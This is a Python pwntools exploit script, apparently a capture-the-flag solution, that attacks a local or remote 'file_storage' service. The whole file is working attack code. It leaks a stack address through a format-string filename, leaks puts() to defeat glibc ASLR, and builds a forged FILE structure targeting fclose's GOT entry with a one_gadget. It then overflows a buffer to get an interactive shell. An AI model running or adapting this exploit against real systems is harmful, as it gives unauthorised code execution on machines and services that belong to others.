#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('file_storage')
glibc = ELF('libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def fsop(addr: int, _lock: int) -> bytes:
    payload  = p64(0xfbad2484)
    payload += p64(0) * 6
    payload += p64(addr)
    payload += p64(addr + 8)
    payload += p64(0) * 4
    payload += p64(glibc.symbols._IO_2_1_stderr_)
    payload += p64(3)
    payload += p64(0) * 2
    payload += p64(_lock)
    payload += b'\xff' * 8
    payload += p64(0)
    payload += p64(_lock + 0x10)
    payload += p64(0) * 6
    payload += p64(glibc.symbols._IO_file_jumps)

    return payload


def brute_force_filename(p) -> bytes:
    filename_progress = log.progress('Filename')

    for a in string.ascii_uppercase:
        for b in string.ascii_uppercase:
            filename = f'{a}{b}.txt'
            filename_progress.status(filename)
            p.sendlineafter(b'> ', b'1')
            p.sendlineafter(b'Filename: ', filename.encode())
            msg = p.recvuntil(b':')

            if b'Error' not in msg:
                filename_progress.success(filename)
                return filename.encode()


def main():
    p = get_process()
    p.sendlineafter(b'> ', b'3')
    sleep(6)
    p.close()
    print()

    p = get_process()
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'content:\n', str(elf.got.puts).encode())
    sleep(1)
    p.close()
    print()

    p = get_process()
    filename = brute_force_filename(p)
    p.close()
    print()

    p = get_process()
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Filename: ', f'%1$ptxt'.encode())
    p.recvuntil(b'Debug: /tmp/')
    stack_leak = int(p.recvline().decode().strip('txt\n'), 16)
    log.success(f'Stack leak: {hex(stack_leak)}')

    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Filename: ', filename)
    p.sendlineafter(b'(string/number): ', b'number')

    puts_addr = u64(p.recvline().strip(b'\n').ljust(8, b'\0'))
    log.info(f'Leaked puts() address: {hex(puts_addr)}')

    glibc.address = puts_addr - glibc.symbols.puts
    log.success(f'Glibc base address: {hex(glibc.address)}')

    offset = 288
    one_gadgets = [0xe3afe, 0xe3b01, 0xe3b04]

    payload  = p64(glibc.address + one_gadgets[1])
    payload += fsop(elf.got.fclose, stack_leak)
    payload += b'A' * (offset - len(payload))
    payload += p64(stack_leak + 0x26a8)

    p.sendlineafter(b'(yes/no): ', b'yes')
    p.sendlineafter(b'content:\n', payload)

    p.interactive()


if __name__ == '__main__':
    main()
